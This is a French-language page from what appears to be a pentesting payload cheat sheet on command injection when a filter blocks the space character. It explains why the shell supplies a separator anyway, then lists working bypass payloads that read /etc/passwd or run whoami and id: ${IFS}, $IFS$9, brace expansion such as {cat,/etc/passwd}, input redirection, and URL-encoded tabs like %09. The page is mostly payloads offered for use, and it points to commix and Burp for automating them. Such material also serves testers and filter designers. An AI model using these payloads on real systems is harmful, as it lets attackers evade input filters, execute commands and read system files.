---
order: 1
title: "Injection de commande sans espace : exécuter des commandes shell sans le caractère espace"
description: "Produire whoami/id quand le caractère espace est filtré, en utilisant ${IFS}, $IFS$9, l'expansion d'accolades, la redirection d'entrée et des substituts de tabulation pour séparer une commande de ses arguments."
keywords:
  - injection de commande
  - contournement de filtre
  - no space
  - IFS
  - expansion d'accolades
  - contournement de WAF
---

# Payloads sans espace

De nombreux filtres d'injection de commande bloquent l'espace ASCII (`0x20`), supposant que sans lui un attaquant ne peut pas séparer une commande de ses arguments. Le shell, cependant, offre plusieurs autres moyens de produire un séparateur de champ, et il les applique *après* que le filtre a inspecté les octets bruts. Une blocklist qui cherche un espace littéral, ou `cat /etc/passwd` comme un seul token, ne voit jamais le séparateur que le shell finit par synthétiser.

## Pourquoi le shell comble le vide

Le découpage en mots dans les shells POSIX est piloté par la variable `IFS`, qui vaut par défaut espace, tabulation et saut de ligne. Toute construction qui s'évalue à l'un de ces caractères, ou qui sépare structurellement les mots, supprime le besoin d'un espace tapé. Le filtre voit `${IFS}` ; le shell voit un espace.

## `${IFS}` et variantes

Le substitut canonique évalue `IFS` directement entre les tokens :

```
cat${IFS}/etc/passwd
whoami${IFS}
```

`$IFS` seul échoue souvent parce que le shell lit avidement les caractères suivants comme faisant partie du nom de la variable. Ajoutez un paramètre positionnel presque toujours vide pour le terminer proprement :

```
cat$IFS$9/etc/passwd
```

`$9` (un argument positionnel non défini) s'évalue à rien, donc `$IFS$9` se réduit à un unique séparateur. `${IFS%??}` et `$IFS$1` se comportent de façon similaire.

## Expansion d'accolades

Une liste d'accolades séparée par des virgules est développée en mots distincts sans espace dans la source :

```
{cat,/etc/passwd}
{whoami,}
{id,}
```

Le shell découpe les accolades en `cat` `/etc/passwd` comme entrées `argv` distinctes avant l'exécution.

## Redirection d'entrée

L'opérateur `<` fournit un fichier à l'entrée standard d'une commande et n'a besoin d'aucun espace autour du nom de fichier :

```
cat</etc/passwd
sort</etc/passwd
```

Pour les commandes qui lisent l'entrée standard, cela délivre le contenu du fichier tout en évitant à la fois l'espace et un argument de chemin explicite.

## Tabulations et espaces encodés en URL

Une tabulation littérale est aussi dans l'`IFS` par défaut. Dans une requête HTTP, elle est envoyée encodée en URL, ce qui ne correspond pas à un filtre uniquement sur l'espace :

```
cat%09/etc/passwd
```

`%09` (tabulation) et, dans certains contextes, `%0b`/`%0c` atteignent le shell comme des espaces. Combinez avec les astuces de fragmentation de mots-clés là où le mot-clé lui-même est filtré.

## Outils

- **[Burp Suite](https://portswigger.net/burp)** : Repeater pour élaborer des payloads sans espace.
- **[commix](https://github.com/commixproject/commix)** : les scripts tamper automatisent les contournements sans espace.

## Références

- [PayloadsAllTheThings: Command Injection, bypass without space](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [GTFOBins](https://gtfobins.github.io/)
